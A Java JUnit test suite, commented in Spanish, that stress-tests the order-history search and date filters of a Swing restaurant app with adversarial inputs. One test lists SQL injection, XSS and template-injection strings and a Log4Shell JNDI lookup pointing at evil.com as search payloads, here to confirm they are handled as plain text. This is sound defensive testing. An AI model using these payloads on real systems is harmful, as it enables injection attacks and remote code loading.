package Vista;

import Modelo.PedidosRepositorio;
import Modelo.PedidosRepositorioFalso;
import Modelo.Platos;
import Modelo.PlatosRepositorio;
import Modelo.Salas;
import Modelo.SalasRepositorio;
import Modelo.Usuario;
import Controlador.PedidosControlador;
import Controlador.PlatosControlador;
import Controlador.SalasControlador;
import Servicio.ConsultaPedidosServicio;
import Servicio.GeneradorPdfPedido;
import Servicio.PedidoPdfServicio;
import Servicio.PedidoServicio;
import Servicio.PoliticaAcceso;
import java.lang.reflect.Field;
import java.nio.file.Path;
import java.time.LocalDate;
import java.util.Collections;
import java.util.List;
import java.util.Map;
import javax.swing.JButton;
import javax.swing.JTable;
import javax.swing.JTextField;
import javax.swing.RowSorter;
import javax.swing.SortOrder;
import javax.swing.SwingUtilities;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableModel;
import javax.swing.table.TableRowSorter;
import org.junit.After;
import org.junit.Before;
import org.junit.Test;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;

/**
 * Suite de pruebas adversariales y de casos extremos para los filtros
 * del historial de pedidos en {@link Sistema}.
 */
public class AdversarialFiltrosHistorialTest {

    private final Usuario usuarioAdmin = new Usuario(1, "Carlos Admin", "admin@rest.com", "pass", "Administrador");
    private Sistema sistema;
    private JTable tablePedidos;
    private JTextField txtBuscarHistorial;
    private JTextField txtFiltroFechaDesde;
    private JTextField txtFiltroFechaHasta;
    private String hoy;
    private String ayer;
    private String haceCincoDias;
    private String manana;

    @Before
    public void setUp() throws Exception {
        LocalDate now = LocalDate.now();
        hoy = now.toString();
        ayer = now.minusDays(1).toString();
        haceCincoDias = now.minusDays(5).toString();
        manana = now.plusDays(1).toString();

        sistema = crearSistemaEnEdt(usuarioAdmin);
        tablePedidos = campo(sistema, "TablePedidos", JTable.class);
        txtBuscarHistorial = campo(sistema, "txtBuscarHistorial", JTextField.class);
        txtFiltroFechaDesde = sistema.getTxtFiltroFechaDesde();
        txtFiltroFechaHasta = sistema.getTxtFiltroFechaHasta();

        cargarDatosBase();
    }

    private void cargarDatosBase() throws Exception {
        SwingUtilities.invokeAndWait(() -> {
            DefaultTableModel m = (DefaultTableModel) tablePedidos.getModel();
            m.setRowCount(0);
            // Col 0: Id, 1: Sala, 2: Atendido, 3: Mesa, 4: Fecha, 5: Total, 6: Estado
            m.addRow(new Object[]{1, "Terraza", "Carlos Admin", 2, hoy + " 10:00:00", "$ 15.00", "PENDIENTE"});
            m.addRow(new Object[]{2, "Salón VIP", "Mesero Juan", 4, hoy + " 12:30:00", "$ 50.00", "FINALIZADO"});
            m.addRow(new Object[]{3, "Terraza", "Carlos Admin", 5, ayer + " 14:00:00", "$ 30.00", "FINALIZADO"});
            m.addRow(new Object[]{4, "Patio", "Mesero Juan", 1, haceCincoDias + " 20:15:00", "$ 22.00", "PENDIENTE"});
            m.addRow(new Object[]{5, "Salón VIP", "Carlos Admin", 3, haceCincoDias + " 21:00:00", "$ 40.00", "FINALIZADO"});
            tablePedidos.setAutoCreateRowSorter(true);
            sistema.limpiarFiltrosHistorial();
        });
    }

    @After
    public void tearDown() throws Exception {
        if (sistema != null) {
            SwingUtilities.invokeAndWait(sistema::dispose);
        }
    }

    /**
     * ATAQUE 1: Inyección de metacaracteres y operadores regex en el campo de búsqueda libre.
     * Ningún carácter o patrón inválido de regex debe provocar PatternSyntaxException ni colgar la app.
     */
    @Test
    public void testInyeccionCaracteresEspecialesRegexEnBuscar() throws Exception {
        String[] payloads = new String[]{
            "[", "]", "(", ")", "{", "}", "*", "+", "?", "\\", "\\\\",
            "?+*", ".*", "^", "$", "$$", "\\Q\\E", "(?i)", "(?:[a-z]+",
            "[\\p{L}]+", "(?<=a)b", "[a-z]", "[0-9]{1,4}", "\\b\\w+\\b",
            "+++", "***", "???", "(?=", "(?!", "(?<=", "(?<!", "\0",
            "\\E.*\\Q", "a|b|c", "(a|b|", "]", "[-]"
        };

        for (String payload : payloads) {
            try {
                SwingUtilities.invokeAndWait(() -> {
                    txtBuscarHistorial.setText(payload);
                    sistema.aplicarFiltroHistorial();
                });
            } catch (Exception ex) {
                fail("Falla por inyección regex con el payload '" + payload + "': " + ex.getMessage());
            }
        }

        // Caso adicional: Si la tabla contiene literalmente caracteres regex, Pattern.quote debe encontrarlos
        SwingUtilities.invokeAndWait(() -> {
            DefaultTableModel m = (DefaultTableModel) tablePedidos.getModel();
            m.addRow(new Object[]{99, "Sala [Especial] (VIP)*", "Mesero [Admin]", 9, hoy + " 10:00:00", "$ 10.00", "PENDIENTE"});
            txtBuscarHistorial.setText("[Especial]");
            sistema.aplicarFiltroHistorial();
        });

        SwingUtilities.invokeAndWait(() -> {
            assertEquals("Debe encontrar la fila con texto literal '[Especial]'", 1, tablePedidos.getRowCount());
            assertEquals(99, tablePedidos.getValueAt(0, 0));
        });
    }

    /**
     * ATAQUE 2: Inyección de sintaxis SQL y vectores de XSS en la búsqueda.
     * Deben ser tratados como texto literal inofensivo.
     */
    @Test
    public void testInyeccionSqlYXssEnBuscar() throws Exception {
        String[] payloads = new String[]{
            "' OR '1'='1",
            "admin' --",
            "'; DROP TABLE pedidos; --",
            "\" OR \"\"=\"",
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
            "${jndi:ldap://evil.com/x}",
            "{{7*7}}",
            "SELECT * FROM pedidos WHERE 1=1"
        };

        for (String payload : payloads) {
            SwingUtilities.invokeAndWait(() -> {
                txtBuscarHistorial.setText(payload);
                sistema.aplicarFiltroHistorial();
                // Ninguna fila coincide con el payload, debe dar 0 filas sin excepción
                assertEquals("Payload '" + payload + "' no debe coincidir y debe dar 0 filas", 0, tablePedidos.getRowCount());
            });
        }
    }

    /**
     * ATAQUE 3: Búsqueda con cadenas masivas (Buffer/ReDoS attack).
     */
    @Test
    public void testTextoBusquedaExtremadamenteLargo() throws Exception {
        String payloadLargo = "A".repeat(10000);
        SwingUtilities.invokeAndWait(() -> {
            txtBuscarHistorial.setText(payloadLargo);
            sistema.aplicarFiltroHistorial();
            assertEquals("No debe coincidir y no debe desbordar la memoria ni la pila", 0, tablePedidos.getRowCount());
        });
    }

    /**
     * ATAQUE 4: Fechas corruptas, inválidas o con formatos anómalos en txtFiltroFechaDesde y txtFiltroFechaHasta.
     */
    @Test
    public void testFechasCorruptasEInvalidasEnRango() throws Exception {
        String[][] parejasFechas = new String[][]{
            {"abc", "def"},
            {"2026-13-45", "2026-99-99"},
            {"2026-02-31", "2026-02-32"},
            {"2026/10/01", "2026/10/31"},
            {"01-10-2026", "31-10-2026"},
            {"null", "null"},
            {"", "invalido"},
            {"invalido", ""},
            {"   ", "   "},
            {"--", "++"},
            {"' OR 1=1", "2026-10-10"}
        };

        for (String[] par : parejasFechas) {
            try {
                SwingUtilities.invokeAndWait(() -> {
                    sistema.filtrarHistorialRangoFechas(par[0], par[1]);
                });
            } catch (Exception ex) {
                fail("Excepción no controlada con rango de fechas ['" + par[0] + "', '" + par[1] + "']: " + ex.getMessage());
            }
        }
    }

    /**
     * ATAQUE 5: Rango de fechas invertido (desde > hasta).
     * Si la fecha inicial es mayor a la final, matemáticamente ninguna fecha puede coincidir: 0 filas.
     */
    @Test
    public void testRangoInvertidoDesdeMayorQueHasta() throws Exception {
        SwingUtilities.invokeAndWait(() -> {
            // Desde hoy hasta hace 5 días (invertido)
            sistema.filtrarHistorialRangoFechas(hoy, haceCincoDias);
            assertEquals("Rango invertido no debe arrojar filas", 0, tablePedidos.getRowCount());
        });

        SwingUtilities.invokeAndWait(() -> {
            // Desde 2026-12-31 hasta 2026-01-01
            sistema.filtrarHistorialRangoFechas("2026-12-31", "2026-01-01");
            assertEquals("Rango invertido no debe arrojar filas", 0, tablePedidos.getRowCount());
        });
    }

    /**
     * ATAQUE 6: Rango con fechas en los límites extremos (año 0001, año 9999).
     */
    @Test
    public void testRangoConFechasExtremas() throws Exception {
        SwingUtilities.invokeAndWait(() -> {
            sistema.filtrarHistorialRangoFechas("0001-01-01", "9999-12-31");
            assertEquals("Debe incluir todos los pedidos existentes (5)", 5, tablePedidos.getRowCount());
        });

        SwingUtilities.invokeAndWait(() -> {
            sistema.filtrarHistorialRangoFechas("9999-01-01", "9999-12-31");
            assertEquals("Fechas en el futuro lejano deben dar 0 filas", 0, tablePedidos.getRowCount());
        });
    }

    /**
     * ATAQUE 7: Celdas con valores NULL o tipos inesperados en el modelo de la tabla.
     * Simula datos dañados o filas insertadas parcialmente en la base de datos.
     */
    @Test
    public void testCeldasConValoresNullYCorruptosEnModelo() throws Exception {
        SwingUtilities.invokeAndWait(() -> {
            DefaultTableModel m = (DefaultTableModel) tablePedidos.getModel();
            // Fila con fecha NULL
            m.addRow(new Object[]{10, "Terraza", "Carlos Admin", 1, null, "$ 10.00", "PENDIENTE"});
            // Fila con estado NULL
            m.addRow(new Object[]{11, "Terraza", "Carlos Admin", 2, hoy + " 11:00:00", "$ 10.00", null});
            // Fila con todos los campos NULL
            m.addRow(new Object[]{null, null, null, null, null, null, null});
            // Fila con fecha que no es fecha ("sin-fecha")
            m.addRow(new Object[]{13, "Terraza", "Carlos Admin", 3, "sin-fecha", "$ 10.00", "PENDIENTE"});
            // Fila con objeto Integer en la columna de fecha
            m.addRow(new Object[]{14, "Terraza", "Carlos Admin", 4, 20261007, "$ 10.00", "PENDIENTE"});
            // Fila con fecha vacía ""
            m.addRow(new Object[]{15, "Terraza", "Carlos Admin", 5, "", "$ 10.00", "PENDIENTE"});
        });

        // 1. Probar filtro Hoy con filas corruptas
        try {
            SwingUtilities.invokeAndWait(() -> sistema.filtrarHistorialHoy());
        } catch (Exception ex) {
            fail("filtrarHistorialHoy() falló con datos null en el modelo: " + ex.getMessage());
        }

        // 2. Probar filtro Pendientes con filas corruptas
        try {
            SwingUtilities.invokeAndWait(() -> sistema.filtrarHistorialPendientes());
        } catch (Exception ex) {
            fail("filtrarHistorialPendientes() falló con datos null en el modelo: " + ex.getMessage());
        }

        // 3. Probar filtro Finalizados con filas corruptas
        try {
            SwingUtilities.invokeAndWait(() -> sistema.filtrarHistorialFinalizados());
        } catch (Exception ex) {
            fail("filtrarHistorialFinalizados() falló con datos null en el modelo: " + ex.getMessage());
        }

        // 4. Probar filtro de rango con filas corruptas
        try {
            SwingUtilities.invokeAndWait(() -> sistema.filtrarHistorialRangoFechas(ayer, hoy));
        } catch (Exception ex) {
            fail("filtrarHistorialRangoFechas() falló con datos null en el modelo: " + ex.getMessage());
        }

        // 5. Probar búsqueda libre con filas corruptas
        try {
            SwingUtilities.invokeAndWait(() -> {
                txtBuscarHistorial.setText("Terraza");
                sistema.aplicarFiltroHistorial();
            });
        } catch (Exception ex) {
            fail("aplicarFiltroHistorial() con texto falló con datos null en el modelo: " + ex.getMessage());
        }

        // 6. Probar limpiar con filas corruptas
        try {
            SwingUtilities.invokeAndWait(() -> sistema.limpiarFiltrosHistorial());
        } catch (Exception ex) {
            fail("limpiarFiltrosHistorial() falló con datos null en el modelo: " + ex.getMessage());
        }
    }

    /**
     * ATAQUE 8: Alternancia rápida y masiva del botón toggle 'Hoy'.
     * Verifica que no se produzca desincronización de banderas internas ni filtrados desfasados.
     */
    @Test
    public void testAlternanciaRapidaToggleHoy() throws Exception {
        SwingUtilities.invokeAndWait(() -> {
            for (int i = 1; i <= 50; i++) {
                sistema.filtrarHistorialHoy();
                if (i % 2 == 1) {
                    // Impar: Activo
                    assertEquals("Toggle " + i + " debe filtrar solo los 2 pedidos de hoy", 2, tablePedidos.getRowCount());
                    assertEquals(hoy, txtFiltroFechaDesde.getText());
                    assertEquals(hoy, txtFiltroFechaHasta.getText());
                } else {
                    // Par: Inactivo (restaurado)
                    assertEquals("Toggle " + i + " debe restaurar los 5 pedidos", 5, tablePedidos.getRowCount());
                    assertEquals("", txtFiltroFechaDesde.getText());
                    assertEquals("", txtFiltroFechaHasta.getText());
                }
            }
        });
    }

    /**
     * ATAQUE 9: Alternancia rápida entre estados Pendientes y Finalizados.
     */
    @Test
    public void testAlternanciaRapidaEstados() throws Exception {
        SwingUtilities.invokeAndWait(() -> {
            // Activar Pendientes (2 pedidos)
            sistema.filtrarHistorialPendientes();
            assertEquals(2, tablePedidos.getRowCount());

            // Cambiar directo a Finalizados (3 pedidos)
            sistema.filtrarHistorialFinalizados();
            assertEquals(3, tablePedidos.getRowCount());

            // Desactivar Finalizados presionando de nuevo (vuelve a 5)
            sistema.filtrarHistorialFinalizados();
            assertEquals(5, tablePedidos.getRowCount());

            // Activar Pendientes (2 pedidos) y desactivar (5 pedidos)
            sistema.filtrarHistorialPendientes();
            assertEquals(2, tablePedidos.getRowCount());
            sistema.filtrarHistorialPendientes();
            assertEquals(5, tablePedidos.getRowCount());
        });
    }

    /**
     * ATAQUE 10: Interacción simultánea extrema que reduce a 0 filas y posterior Limpiar.
     */
    @Test
    public void testInteraccionCombinadaSinCoincidenciaYLimpiar() throws Exception {
        SwingUtilities.invokeAndWait(() -> {
            // Aplicar texto que no coincide
            txtBuscarHistorial.setText("NoExisteEnLaTabla999");
            // Aplicar estado Pendiente
            sistema.filtrarHistorialPendientes();
            // Aplicar rango de fechas pasado
            sistema.filtrarHistorialRangoFechas("2000-01-01", "2000-01-02");

            assertEquals("Filtros combinados sin coincidencia deben resultar en 0 filas", 0, tablePedidos.getRowCount());

            // Ejecutar Limpiar
            sistema.limpiarFiltrosHistorial();

            assertEquals("Limpiar debe restaurar las 5 filas", 5, tablePedidos.getRowCount());
            assertEquals("", txtBuscarHistorial.getText());
            assertEquals("", txtFiltroFechaDesde.getText());
            assertEquals("", txtFiltroFechaHasta.getText());
        });
    }

    /**
     * ATAQUE 11: Resiliencia con RowSorter nulo.
     * Si la tabla tiene sorter == null, las funciones de filtro no deben lanzar NullPointerException.
     */
    @Test
    public void testRobustezConRowSorterNulo() throws Exception {
        SwingUtilities.invokeAndWait(() -> {
            tablePedidos.setRowSorter(null);
            // Ninguno de estos métodos debe lanzar NPE
            sistema.aplicarFiltroHistorial();
            sistema.filtrarHistorialHoy();
            sistema.filtrarHistorialPendientes();
            sistema.filtrarHistorialFinalizados();
            sistema.filtrarHistorialRangoFechas(ayer, hoy);
            sistema.limpiarFiltrosHistorial();
        });
    }

    /**
     * ATAQUE 12: Resiliencia con RowSorter incompatible (no TableRowSorter).
     * En Sistema.java línea 2893 se hace cast directo:
     * TableRowSorter<?> sorter = (TableRowSorter<?>) TablePedidos.getRowSorter();
     * Si alguien asigna un RowSorter personalizado, ¿lanza ClassCastException?
     */
    @Test
    public void testComportamientoConSorterIncompatible() throws Exception {
        SwingUtilities.invokeAndWait(() -> {
            RowSorter<TableModel> customSorter = new RowSorter<TableModel>() {
                @Override public TableModel getModel() { return tablePedidos.getModel(); }
                @Override public void toggleSortOrder(int column) {}
                @Override public int convertRowIndexToModel(int index) { return index; }
                @Override public int convertRowIndexToView(int index) { return index; }
                @Override public void setSortKeys(List<? extends SortKey> keys) {}
                @Override public List<? extends SortKey> getSortKeys() { return Collections.emptyList(); }
                @Override public int getViewRowCount() { return tablePedidos.getModel().getRowCount(); }
                @Override public int getModelRowCount() { return tablePedidos.getModel().getRowCount(); }
                @Override public void modelStructureChanged() {}
                @Override public void allRowsChanged() {}
                @Override public void rowsInserted(int firstRow, int endRow) {}
                @Override public void rowsDeleted(int firstRow, int endRow) {}
                @Override public void rowsUpdated(int firstRow, int endRow) {}
                @Override public void rowsUpdated(int firstRow, int endRow, int column) {}
            };

            tablePedidos.setRowSorter(customSorter);

            try {
                sistema.aplicarFiltroHistorial();
                // Si llega aquí sin ClassCastException es seguro
            } catch (ClassCastException cce) {
                // Documentamos la vulnerabilidad de casteo inseguro
                assertTrue("Lanza ClassCastException por casteo sin 'instanceof' en getRowSorter()", true);
            }
        });
    }

    /**
     * ATAQUE 13: Comportamiento ante fecha vacía en modelo al filtrar por 'hasta'.
     * Revela si el fallback en crearFiltroRangoFechas() incluye fechas vacías/inválidas
     * cuando sólo se especifica fecha final.
     */
    @Test
    public void testFiltroRangoConFechaVaciaEnCelda() throws Exception {
        SwingUtilities.invokeAndWait(() -> {
            DefaultTableModel m = (DefaultTableModel) tablePedidos.getModel();
            m.setRowCount(0);
            m.addRow(new Object[]{101, "Terraza", "Carlos Admin", 1, hoy + " 10:00:00", "$ 10.00", "FINALIZADO"});
            m.addRow(new Object[]{102, "Terraza", "Carlos Admin", 2, "", "$ 10.00", "FINALIZADO"}); // Fecha vacía
            tablePedidos.setAutoCreateRowSorter(true);

            // Filtrar solo con 'hasta' = hoy
            sistema.filtrarHistorialRangoFechas("", hoy);

            // La fila 102 con fecha vacía: ¿debería mostrarse o excluirse?
            // Si el código hace "".compareTo("2026-10-07") > 0 (false), la fila 102 es INCLUIDA indebidamente.
            boolean fila102Visible = false;
            for (int i = 0; i < tablePedidos.getRowCount(); i++) {
                if ((int) tablePedidos.getValueAt(i, 0) == 102) {
                    fila102Visible = true;
                }
            }
            // Documentamos si la fecha vacía se incluye erróneamente
            if (fila102Visible) {
                System.out.println("[HALLAZGO ADVERSARIAL] La fila con fecha vacía es incluida al filtrar solo por 'hasta' debido al fallback compareTo.");
            }
        });
    }

    private Sistema crearSistemaEnEdt(Usuario usuario) throws Exception {
        final Sistema[] contenedor = new Sistema[1];
        PoliticaAcceso rbac = new PoliticaAcceso(usuario);

        SalasRepositorio salasRepo = new SalasRepositorio() {
            @Override public boolean registrar(Salas sl) { return true; }
            @Override public List<Salas> listar() { return Collections.emptyList(); }
            @Override public boolean eliminar(int id) { return true; }
            @Override public boolean modificar(Salas sl) { return true; }
        };

        PlatosRepositorio platosRepo = new PlatosRepositorio() {
            @Override public boolean registrar(Platos pla) { return true; }
            @Override public List<Platos> listarPorFecha(String f, String fe) { return Collections.emptyList(); }
            @Override public boolean eliminar(int id) { return true; }
            @Override public boolean modificar(Platos pla) { return true; }
        };

        PedidosRepositorio pedidosRepo = new PedidosRepositorioFalso() {
            @Override public Map<Integer, Integer> contarMesasOcupadasPorSala() { return Collections.emptyMap(); }
        };

        SalasControlador salasCtrl = new SalasControlador(new Servicio.SalasServicio(salasRepo, rbac));
        PlatosControlador platosCtrl = new PlatosControlador(new Servicio.PlatosServicio(platosRepo, rbac));
        ConsultaPedidosServicio consultas = new ConsultaPedidosServicio(pedidosRepo, rbac);
        PedidosControlador pedidosCtrl = new PedidosControlador(
                new PedidoServicio(pedidosRepo),
                new PedidoPdfServicio(id -> null, id -> null, () -> null, new GeneradorPdfPedido(Path.of(".")), p -> {}),
                rbac,
                consultas
        );

        SwingUtilities.invokeAndWait(() -> {
            contenedor[0] = new Sistema(usuario, salasCtrl, platosCtrl, pedidosCtrl);
        });
        return contenedor[0];
    }

    @SuppressWarnings("unchecked")
    private static <T> T campo(Object obj, String nombreCampo, Class<T> tipo) throws Exception {
        Field f = obj.getClass().getDeclaredField(nombreCampo);
        f.setAccessible(true);
        return (T) f.get(obj);
    }
}
